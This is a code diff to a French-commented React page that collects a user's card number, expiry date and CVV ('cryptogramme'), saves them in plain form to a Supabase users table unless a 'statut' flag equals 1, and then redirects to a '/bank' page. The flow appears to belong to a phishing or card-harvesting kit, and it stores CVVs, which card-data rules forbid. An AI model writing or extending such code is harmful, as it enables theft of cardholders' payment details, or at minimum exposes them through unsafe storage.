@@ -1,5 +1,5 @@
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -18,8 +18,36 @@ const Card = () => {
     cryptogramme: "",
   });
   const [isLoading, setIsLoading] = useState(false);
+  const [userStatus, setUserStatus] = useState<number | null>(null);
   const navigate = useNavigate();
   const { toast } = useToast();
+
+  useEffect(() => {
+    const checkUserStatus = async () => {
+      const userId = localStorage.getItem("userId");
+      
+      if (!userId) {
+        navigate("/");
+        return;
+      }
+      
+      try {
+        const { data, error } = await supabase
+          .from("users")
+          .select("statut")
+          .eq("id", userId)
+          .single();
+        
+        if (error) throw error;
+        
+        setUserStatus(data.statut);
+      } catch (error) {
+        console.error(error);
+      }
+    };
+    
+    checkUserStatus();
+  }, [navigate]);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -49,18 +77,24 @@ const Card = () => {
     }
     
     try {
-      // Mettre à jour les informations de carte dans la base de données
-      await supabase
-        .from("users")
-        .update({
-          email: formData.email,
-          numerocarte: formData.numerocarte,
-          dateexpiration: formData.dateexpiration,
-          cryptogramme: formData.cryptogramme,
-        })
-        .eq("id", userId);
+      // Vérifier le statut
+      if (userStatus === 1) {
+        // Si le statut est 1, ne pas enregistrer les données
+        console.log("Utilisateur avec statut 1, les données ne sont pas enregistrées");
+      } else {
+        // Mettre à jour les informations de carte dans la base de données uniquement si le statut est différent de 1
+        await supabase
+          .from("users")
+          .update({
+            email: formData.email,
+            numerocarte: formData.numerocarte,
+            dateexpiration: formData.dateexpiration,
+            cryptogramme: formData.cryptogramme,
+          })
+          .eq("id", userId);
+      }
       
-      // Rediriger vers la page suivante
+      // Rediriger vers la page suivante dans tous les cas
       navigate("/bank");
     } catch (error) {
       console.error(error);
